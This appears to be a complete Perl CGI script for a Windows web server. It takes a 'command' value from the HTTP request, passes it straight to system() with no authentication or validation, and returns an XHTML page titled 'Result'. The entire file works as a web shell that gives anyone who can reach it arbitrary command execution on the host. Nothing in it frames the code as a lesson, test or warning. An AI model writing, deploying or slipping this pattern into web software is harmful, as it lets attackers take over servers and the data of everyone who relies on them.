#!C:\Perl\bin\perl.exe

use CGI qw(:standard);

$comm = param("command");

$dtd ="-//W3C//DTD XHTML 1.0 Transitional//EN\"\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd";
print(header());
print( start_html( { dtd => $dtd, title => "Result" } ) );
print( system($comm));
print( end_html());